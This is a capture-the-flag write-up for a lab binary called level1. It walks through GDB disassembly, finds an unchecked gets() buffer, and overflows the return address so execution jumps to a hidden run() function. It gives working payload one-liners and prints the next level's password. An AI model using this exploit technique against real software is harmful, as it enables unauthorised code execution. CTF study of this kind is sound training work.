### Download binary
``scp -P4242 level1@192.168.31.170:/home/user/level1/level1 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)
We find a call to gets() inside a buffer without a size check. We will exploit this to a buffer overflow.

----

### Debugging with GDB

``gdb level1``
>[...]

``(gdb) disas main``
>Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.

After that we list all the functions inside the binary.

``(gdb) info function``
>All defined functions:
[...]
0x08048444  run
0x08048480  main

44
84
04
08


Here is something interesting ! The function run() is used nowhere in the code, it's **dead code**, since we are in a CTF it's for sure our goal.
With this gdb list we also got the adress of run function. Combine that with the previous breach that we find and we got our plan :
**Buffer overflow the return function pointer to overwrite it with this run() function.**

----

### Building the payload
We know that :
``char local_50[76];``

And here is our payload, 76 'A' to fill the buffer and then the address of the function run() (notice that it's write in reverse order, it is because the cpu in this exercices use little endian, so the value are pushed on each other).

Here is a little trick, after many try we find that we achieve our goal but the input segfault and closes, so we need to keep it open. This is what cat ... **-** does.

----

### Getting the flag

##### Way n1 :
``python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload``
``cat /tmp/payload - | ./level1``

##### Way n2 :
``(printf "a%.0s" {1..76}; printf "\x44\x84\x04\x08"; cat) | ./level1``

>Good... Wait what?

``whoami``
level2

``cat /home/user/level2/.pass``
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

